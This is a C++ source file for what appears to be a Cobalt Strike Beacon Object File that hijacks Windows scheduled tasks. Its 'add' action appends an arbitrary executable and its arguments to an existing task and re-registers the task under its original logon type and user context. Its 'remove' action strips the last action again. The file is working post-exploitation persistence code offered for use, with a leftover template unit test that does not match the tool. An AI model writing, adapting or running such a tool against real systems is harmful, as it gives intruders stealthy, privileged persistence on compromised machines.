#include <Windows.h>
#include "base\helpers.h"
#include <comdef.h>
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")
#include <taskschd.h>

#ifdef _DEBUG
#include "base\mock.h"
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif

extern "C" {
#include "beacon.h"
	// Define functions
	DFR(OLEAUT32, VariantInit);
	DFR(OLEAUT32, SysAllocString);
	DFR(OLEAUT32, SysFreeString);
	#define VariantInit    OLEAUT32$VariantInit
	#define SysAllocString OLEAUT32$SysAllocString
	#define SysFreeString  OLEAUT32$SysFreeString

	DFR(OLE32, CoInitializeEx);
	DFR(OLE32, CoCreateInstance);
	DFR(OLE32, CoUninitialize);
	#define CoInitializeEx   OLE32$CoInitializeEx
	#define CoCreateInstance OLE32$CoCreateInstance
	#define CoUninitialize   OLE32$CoUninitialize

	DFR(MSVCRT, wcscmp);
	#define wstrcmp MSVCRT$wstrcmp

#ifndef _DEBUG
	// GUIDs for COM
	static const CLSID CLSID_TaskScheduler = { 0x0F87369F, 0xA4E5, 0x4CFC, { 0xBD, 0x3E, 0x73, 0xE6, 0x15, 0x45, 0x72, 0xDD } };
	static const IID   IID_ITaskService = { 0x2FABA4C7, 0x4DA9, 0x4013, { 0x96, 0x97, 0x20, 0xCC, 0x3F, 0xD4, 0x0F, 0x85 } };
	static const IID   IID_IExecAction = { 0x4C3D624D, 0xFD6B, 0x49A3, { 0xB9, 0xB7, 0x09, 0xCB, 0x3C, 0xD3, 0xF0, 0x47 } };
#else
	#define CLSID_TaskScheduler CLSID_TaskScheduler
	#define IID_ITaskService IID_ITaskService
	#define IID_IExecAction IID_IExecAction
#endif

	// Custom helper functions to avoid CRT linking issues
	const wchar_t* find_last_slash(const wchar_t* str) {
		if (!str) return nullptr;
		const wchar_t* last = nullptr;
		while (*str) {
			if (*str == L'\\') {
				last = str;
			}
			str++;
		}
		return last;
	}

	void custom_wcscpy(wchar_t* dest, const wchar_t* src, size_t max_chars) {
		if (!dest || !src || max_chars == 0) return;
		size_t i = 0;
		while (src[i] != L'\0' && i < max_chars - 1) {
			dest[i] = src[i];
			i++;
		}
		dest[i] = L'\0';
	}

	void go(char* args, int len) {
		// Initialize the Beacon Data API parser
		datap parser;
		BeaconDataParse(&parser, args, len);

		// Extract arguments
		// -> Expected as wide strings (Z:arg1 Z:arg2 Z:arg3 Z:arg4)
		wchar_t* action = NULL;
		wchar_t* taskName = NULL;
		wchar_t* newProgramPath = NULL;
		wchar_t* newArguments = NULL;

		if (BeaconDataLength(&parser) > 0) {
			action = (wchar_t*)BeaconDataExtract(&parser, NULL);
		}
		if (BeaconDataLength(&parser) > 0) {
			taskName = (wchar_t*)BeaconDataExtract(&parser, NULL);
		}
		if (BeaconDataLength(&parser) > 0) {
			newProgramPath = (wchar_t*)BeaconDataExtract(&parser, NULL);
		}
		if (BeaconDataLength(&parser) > 0) {
			newArguments = (wchar_t*)BeaconDataExtract(&parser, NULL);
		}

		// Validate action is supplied
		if (!action) {
			BeaconPrintf(CALLBACK_ERROR, "[!] Missing required arguments: <action> is mandatory.\n");
			return;
		}

		// Action: ADD
		if (wcscmp(action, L"add") == 0) {
			BeaconPrintf(CALLBACK_OUTPUT, "[*] Add action selected\n");

			// Validate "add" action inputs
			if (!taskName || !newProgramPath) {
				BeaconPrintf(CALLBACK_ERROR, "[!] Missing required arguments: <task_name_or_path> and <new_program_path> are mandatory.\n");
				return;
			}

			// Initialize COM library
			HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
			if (FAILED(hr)) {
				BeaconPrintf(CALLBACK_ERROR, "CoInitializeEx failed: 0x%08X\n", hr);
				return;
			}

			ITaskService* pService = nullptr;
			hr = CoCreateInstance(CLSID_TaskScheduler, nullptr, CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER, IID_ITaskService, (void**)&pService);
			if (FAILED(hr)) {
				BeaconPrintf(CALLBACK_ERROR, "Failed to create ITaskService instance: 0x%08X\n", hr);
				CoUninitialize();
				return;
			}

			VARIANT vtEmpty;
			VariantInit(&vtEmpty);

			hr = pService->Connect(vtEmpty, vtEmpty, vtEmpty, vtEmpty);
			if (FAILED(hr)) {
				BeaconPrintf(CALLBACK_ERROR, "Failed to connect to Task Scheduler: 0x%08X\n", hr);
				pService->Release();
				CoUninitialize();
				return;
			}

			// Parse the taskName to separate folder path and task name
			wchar_t folderPath[512] = { 0 };
			wchar_t actualTaskName[256] = { 0 };

			const wchar_t* lastSlash = find_last_slash(taskName);
			if (lastSlash != nullptr) {
				size_t folderLen = lastSlash - taskName;
				if (folderLen == 0) {
					custom_wcscpy(folderPath, L"\\", 512);
				}
				else {
					if (folderLen >= 512) {
						BeaconPrintf(CALLBACK_ERROR, "[!] Folder path too long.\n");
						pService->Release();
						CoUninitialize();
						return;
					}
					// Copy characters up to lastSlash
					for (size_t i = 0; i < folderLen; i++) {
						folderPath[i] = taskName[i];
					}
					folderPath[folderLen] = L'\0';
				}
				custom_wcscpy(actualTaskName, lastSlash + 1, 256);
			}
			else {
				custom_wcscpy(folderPath, L"\\", 512);
				custom_wcscpy(actualTaskName, taskName, 256);
			}

			BeaconPrintf(CALLBACK_OUTPUT, "[*] Accessing folder: %ls, Task: %ls\n", folderPath, actualTaskName);

			ITaskFolder* pFolder = nullptr;
			BSTR bstrFolder = SysAllocString(folderPath);
			if (!bstrFolder) {
				BeaconPrintf(CALLBACK_ERROR, "[!] Failed to allocate BSTR for folder path.\n");
				pService->Release();
				CoUninitialize();
				return;
			}

			hr = pService->GetFolder(bstrFolder, &pFolder);
			SysFreeString(bstrFolder);

			if (SUCCEEDED(hr)) {
				IRegisteredTask* pRegisteredTask = nullptr;
				BSTR bstrTaskName = SysAllocString(actualTaskName);
				if (!bstrTaskName) {
					BeaconPrintf(CALLBACK_ERROR, "[!] Failed to allocate BSTR for task name.\n");
					pFolder->Release();
					pService->Release();
					CoUninitialize();
					return;
				}

				hr = pFolder->GetTask(bstrTaskName, &pRegisteredTask);

				if (SUCCEEDED(hr)) {
					ITaskDefinition* pDefinition = nullptr;
					hr = pRegisteredTask->get_Definition(&pDefinition);

					if (SUCCEEDED(hr)) {
						IPrincipal* pPrincipal = nullptr;
						TASK_LOGON_TYPE logonType = TASK_LOGON_NONE;

						if (SUCCEEDED(pDefinition->get_Principal(&pPrincipal))) {
							pPrincipal->get_LogonType(&logonType);
							pPrincipal->Release();
						}

						IActionCollection* pActionCollection = nullptr;
						hr = pDefinition->get_Actions(&pActionCollection);

						if (SUCCEEDED(hr)) {
							IAction* pAction = nullptr;
							hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);

							if (SUCCEEDED(hr)) {
								IExecAction* pExecAction = nullptr;
								hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);

								if (SUCCEEDED(hr)) {
									pExecAction->put_Path(BSTR(newProgramPath));
									pExecAction->put_Arguments(newArguments ? BSTR(newArguments) : BSTR(L""));

									IRegisteredTask* pUpdatedTask = nullptr;

									// Re-register using the extracted logonType to prevent registration rejection
									hr = pFolder->RegisterTaskDefinition(
										bstrTaskName,
										pDefinition,
										TASK_UPDATE,
										vtEmpty, vtEmpty, // Passes null variants to preserve existing user context
										logonType,        // Matches the original logon type requirements
										vtEmpty,
										&pUpdatedTask
									);

									if (SUCCEEDED(hr)) {
										BeaconPrintf(CALLBACK_OUTPUT, "Successfully appended action to task '%S'.\n", actualTaskName);
										pUpdatedTask->Release();
									}
									else {
										// Print the specific hexadecimal HRESULT error code for exact debugging
										BeaconPrintf(CALLBACK_ERROR, "Failed to register updated definition. HRESULT: 0x%08X\n", hr);
									}
									pExecAction->Release();
								}
								else {
									BeaconPrintf(CALLBACK_ERROR, "Failed to query IExecAction interface. HRESULT: 0x%08X\n", hr);
								}
								pAction->Release();
							}
							else {
								BeaconPrintf(CALLBACK_ERROR, "Failed to create EXEC action. HRESULT: 0x%08X\n", hr);
							}
							pActionCollection->Release();
						}
						else {
							BeaconPrintf(CALLBACK_ERROR, "Failed to get task actions collection. HRESULT: 0x%08X\n", hr);
						}
						pDefinition->Release();
					}
					else {
						BeaconPrintf(CALLBACK_ERROR, "Failed to get task definition. HRESULT: 0x%08X\n", hr);
					}
					pRegisteredTask->Release();
				}
				else {
					BeaconPrintf(CALLBACK_ERROR, "Scheduled task '%S' not found: 0x%08X\n", actualTaskName, hr);
				}
				SysFreeString(bstrTaskName);
				pFolder->Release();
			}
			else {
				BeaconPrintf(CALLBACK_ERROR, "Failed to get folder %ls. HRESULT: 0x%08X\n", folderPath, hr);
			}

			pService->Release();
			CoUninitialize();
		}

		// Action: REMOVE
		else if(wcscmp(action, L"remove") == 0) {
			BeaconPrintf(CALLBACK_OUTPUT, "[*] Remove action selected\n");

			// Validate "remove" action inputs
			if (!taskName) {
				BeaconPrintf(CALLBACK_ERROR, "[!] Missing required arguments: <task_name_or_path> is mandatory.\n");
				return;
			}

			// Initialize COM library
			HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
			if (FAILED(hr)) {
				BeaconPrintf(CALLBACK_ERROR, "CoInitializeEx failed: 0x%08X\n", hr);
				return;
			}

			ITaskService* pService = nullptr;
			hr = CoCreateInstance(CLSID_TaskScheduler, nullptr, CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER, IID_ITaskService, (void**)&pService);
			if (FAILED(hr)) {
				BeaconPrintf(CALLBACK_ERROR, "Failed to create ITaskService instance: 0x%08X\n", hr);
				CoUninitialize();
				return;
			}

			VARIANT vtEmpty;
			VariantInit(&vtEmpty);

			hr = pService->Connect(vtEmpty, vtEmpty, vtEmpty, vtEmpty);
			if (FAILED(hr)) {
				BeaconPrintf(CALLBACK_ERROR, "Failed to connect to Task Scheduler: 0x%08X\n", hr);
				pService->Release();
				CoUninitialize();
				return;
			}

			// Parse the taskName to separate folder path and task name
			wchar_t folderPath[512] = { 0 };
			wchar_t actualTaskName[256] = { 0 };

			const wchar_t* lastSlash = find_last_slash(taskName);
			if (lastSlash != nullptr) {
				size_t folderLen = lastSlash - taskName;
				if (folderLen == 0) {
					custom_wcscpy(folderPath, L"\\", 512);
				}
				else {
					if (folderLen >= 512) {
						BeaconPrintf(CALLBACK_ERROR, "[!] Folder path too long.\n");
						pService->Release();
						CoUninitialize();
						return;
					}
					// Copy characters up to lastSlash
					for (size_t i = 0; i < folderLen; i++) {
						folderPath[i] = taskName[i];
					}
					folderPath[folderLen] = L'\0';
				}
				custom_wcscpy(actualTaskName, lastSlash + 1, 256);
			}
			else {
				custom_wcscpy(folderPath, L"\\", 512);
				custom_wcscpy(actualTaskName, taskName, 256);
			}

			BeaconPrintf(CALLBACK_OUTPUT, "[*] Accessing folder: %ls, Task: %ls\n", folderPath, actualTaskName);

			ITaskFolder* pFolder = nullptr;
			BSTR bstrFolder = SysAllocString(folderPath);
			if (!bstrFolder) {
				BeaconPrintf(CALLBACK_ERROR, "[!] Failed to allocate BSTR for folder path.\n");
				pService->Release();
				CoUninitialize();
				return;
			}

			hr = pService->GetFolder(bstrFolder, &pFolder);
			SysFreeString(bstrFolder);

			if (SUCCEEDED(hr)) {
				IRegisteredTask* pRegisteredTask = nullptr;
				BSTR bstrTaskName = SysAllocString(actualTaskName);
				if (!bstrTaskName) {
					BeaconPrintf(CALLBACK_ERROR, "[!] Failed to allocate BSTR for task name.\n");
					pFolder->Release();
					pService->Release();
					CoUninitialize();
					return;
				}

				hr = pFolder->GetTask(bstrTaskName, &pRegisteredTask);

				if (SUCCEEDED(hr)) {
					ITaskDefinition* pDefinition = nullptr;
					hr = pRegisteredTask->get_Definition(&pDefinition);

					if (SUCCEEDED(hr)) {
						IPrincipal* pPrincipal = nullptr;
						TASK_LOGON_TYPE logonType = TASK_LOGON_NONE;

						if (SUCCEEDED(pDefinition->get_Principal(&pPrincipal))) {
							pPrincipal->get_LogonType(&logonType);
							pPrincipal->Release();
						}

						IActionCollection* pActionCollection = nullptr;
						hr = pDefinition->get_Actions(&pActionCollection);

						if (SUCCEEDED(hr) && pActionCollection) {
							long count = 0;
							hr = pActionCollection->get_Count(&count);

							// Only remove task action if more than 1 action exists
							if (SUCCEEDED(hr) && count > 1) {
								VARIANT vtIndex;
								VariantInit(&vtIndex);
								vtIndex.vt = VT_I4;
								vtIndex.lVal = count;

								hr = pActionCollection->Remove(vtIndex);

								if (SUCCEEDED(hr)) {
									IRegisteredTask* pUpdatedTask = nullptr;

									// Re-register using the extracted logonType to prevent registration rejection
									hr = pFolder->RegisterTaskDefinition(
										bstrTaskName,
										pDefinition,
										TASK_UPDATE,
										vtEmpty, vtEmpty, // Passes null variants to preserve existing user context
										logonType,        // Matches the original logon type requirements
										vtEmpty,
										&pUpdatedTask
									);

									if (SUCCEEDED(hr)) {
										BeaconPrintf(CALLBACK_OUTPUT, "Successfully removed last action from task '%S'.\n", actualTaskName);
										if (pUpdatedTask) {
											pUpdatedTask->Release();
										}
									}
									else {
										BeaconPrintf(CALLBACK_ERROR, "Failed to register updated definition. HRESULT: 0x%08X\n", hr);
									}
								}
								else {
									BeaconPrintf(CALLBACK_ERROR, "Failed to remove action at index %ld. HRESULT: 0x%08X\n", count, hr);
								}
							}
							else if (SUCCEEDED(hr) && count == 1) {
								BeaconPrintf(CALLBACK_ERROR, "[!] Cannot remove action: task '%S' has only 1 action remaining\n", actualTaskName);
							}
							else if (SUCCEEDED(hr) && count == 0) {
								BeaconPrintf(CALLBACK_ERROR, "[!] Task '%S' has no actions to remove\n", actualTaskName);
							}
							else {
								BeaconPrintf(CALLBACK_ERROR, "Failed to get actions count. HRESULT: 0x%08X\n", hr);
							}
							pActionCollection->Release();
						}
						else {
							BeaconPrintf(CALLBACK_ERROR, "Failed to get task actions collection. HRESULT: 0x%08X\n", hr);
						}
						pDefinition->Release();
					}
					else {
						BeaconPrintf(CALLBACK_ERROR, "Failed to get task definition. HRESULT: 0x%08X\n", hr);
					}
					pRegisteredTask->Release();
				}
				else {
					BeaconPrintf(CALLBACK_ERROR, "Scheduled task '%S' not found: 0x%08X\n", actualTaskName, hr);
				}
				SysFreeString(bstrTaskName);
				pFolder->Release();
			}
			else {
				BeaconPrintf(CALLBACK_ERROR, "Failed to get folder %S. HRESULT: 0x%08X\n", folderPath, hr);
			}

			pService->Release();
			CoUninitialize();
		}
	}
}

// Define a main function for the bebug build
#if defined(_DEBUG) && !defined(_GTEST)

int main(int argc, char* argv[]) {
	// Run BOF's entrypoint
	// To pack arguments for the bof use e.g.: bof::runMocked<int, short, const char*>(go, 6502, 42, "foobar");
	bof::runMocked<const wchar_t*, const wchar_t*, const wchar_t*, const wchar_t*>(
		go,
		L"add",
		L"\\testing",
		L"C:\\windows\\system32\\idontexist.exe",
		L"/test");
	
	/*bof::runMocked<const wchar_t*, const wchar_t*, const wchar_t*, const wchar_t*>(
		go,
		L"remove",
		L"\\testing",
		L"",
		L"");
	*/

	return 0;
}

// Define unit tests
#elif defined(_GTEST)
#include <gtest\gtest.h>

TEST(BofTest, Test1) {
	std::vector<bof::output::OutputEntry> got =
		bof::runMocked<>(go);
	std::vector<bof::output::OutputEntry> expected = {
		{CALLBACK_OUTPUT, "System Directory: C:\\Windows\\system32"}
	};
	// It is possible to compare the OutputEntry vectors, like directly
	// ASSERT_EQ(expected, got);
	// However, in this case, we want to compare the output, ignoring the case.
	ASSERT_EQ(expected.size(), got.size());
	ASSERT_STRCASEEQ(expected[0].output.c_str(), got[0].output.c_str());
}
#endif